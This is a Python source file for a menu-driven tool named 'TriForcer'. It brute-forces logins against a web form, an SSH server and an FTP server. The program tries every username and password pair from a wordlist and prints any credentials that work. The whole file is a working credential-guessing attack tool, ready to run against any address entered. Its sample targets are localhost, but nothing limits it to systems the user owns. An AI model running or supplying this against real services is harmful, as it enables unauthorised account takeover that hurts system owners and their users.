import os
import requests
import paramiko
import ftplib
from urllib.parse import urlparse

# Web Brute-Force Function
def web_bruteforce(target_url, wordlist_path="wordlist.txt"):
    # Validate URL format
    parsed_url = urlparse(target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("[!] Invalid URL format. Please enter a valid URL like http://127.0.0.1:5000/login")
        return

    if not os.path.isfile(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        return

    with open(wordlist_path, 'r') as wordlist:
        usernames = wordlist.readlines()
        wordlist.seek(0)
        passwords = wordlist.readlines()

    print(f"[*] Starting web brute-force on {target_url}")
    print(f"[*] Using wordlist: {wordlist_path}")

    total_checks = 0
    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            total_checks += 1

            try:
                response = requests.post(target_url, data={'username': username, 'password': password}, timeout=5)
                if "Login successful" in response.text:
                    print(f"[+] Found valid credentials: Username: {username} Password: {password}")
                    print(f"[*] Total pairs checked: {total_checks}")
                    return
            except requests.RequestException as e:
                print(f"[!] Error connecting to target: {e}")
                return

    print(f"[!] Brute force completed. No valid credentials found.")
    print(f"[*] Total pairs checked: {total_checks}")

# SSH Brute-Force Function
def ssh_bruteforce(target_ip, port, wordlist_path="wordlist.txt"):
    if not os.path.isfile(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        return

    with open(wordlist_path, 'r') as f:
        usernames = f.readlines()
        f.seek(0)
        passwords = f.readlines()

    print(f"[*] Starting SSH brute-force on {target_ip}:{port}")
    total_checks = 0

    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            total_checks += 1

            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target_ip, port=port, username=username, password=password, timeout=3)
                print(f"[+] Found valid credentials: Username: {username} Password: {password}")
                print(f"[*] Total pairs checked: {total_checks}")
                ssh.close()
                return
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                print(f"[!] Error connecting to SSH: {e}")
                return

    print(f"[!] Brute force completed. No valid credentials found.")
    print(f"[*] Total pairs checked: {total_checks}")

# FTP Brute-Force Function
def ftp_bruteforce(target_ip, port, wordlist_path="wordlist.txt"):
    if not os.path.isfile(wordlist_path):
        print(f"[!] Wordlist not found: {wordlist_path}")
        return

    with open(wordlist_path, 'r') as f:
        usernames = f.readlines()
        f.seek(0)
        passwords = f.readlines()

    print(f"[*] Starting FTP brute-force on {target_ip}:{port}")
    total_checks = 0

    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            total_checks += 1
            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(target_ip, port, timeout=5)
                    ftp.login(user=username, passwd=password)
                    print(f"[+] Found valid credentials: Username: {username} Password: {password}")
                    print(f"[*] Total pairs checked: {total_checks}")
                    return
            except ftplib.error_perm:
                continue
            except Exception as e:
                print(f"[!] FTP error: {e}")
                return

    print(f"[!] Brute force completed. No valid credentials found.")
    print(f"[*] Total pairs checked: {total_checks}")

# Main Menu
def main():
    print("""
    ****************************************
    *             TriForcer               *
    ****************************************
    """)

    wordlist_path = "wordlist.txt"
    try:
        while True:
            print("\n[1] Web Brute-Force Attack")
            print("[2] SSH Brute-Force Attack")
            print("[3] FTP Brute-Force Attack")
            print("[4] Exit")

            choice = input("Select an option (1-4): ").strip()

            if choice == '1':
                target_url = input("Enter target URL (e.g., http://127.0.0.1:5000/login): ").strip()
                web_bruteforce(target_url, wordlist_path)

            elif choice == '2':
                target_ip = input("Enter SSH target IP (e.g., 127.0.0.1): ").strip()
                port = input("Enter SSH port (default 22): ").strip()
                port = int(port) if port.isdigit() else 22
                ssh_bruteforce(target_ip, port, wordlist_path)

            elif choice == '3':
                target_ip = input("Enter FTP target IP (e.g., 127.0.0.1): ").strip()
                port = input("Enter FTP port (default 21): ").strip()
                port = int(port) if port.isdigit() else 21
                ftp_bruteforce(target_ip, port, wordlist_path)

            elif choice == '4':
                print("Exiting TriForcer...")
                break

            else:
                print("[!] Invalid choice, please select a valid option.")
    except KeyboardInterrupt:
        print("\n[*] KeyboardInterrupt detected. Exiting TriForcer gracefully...")

if __name__ == "__main__":
    main()
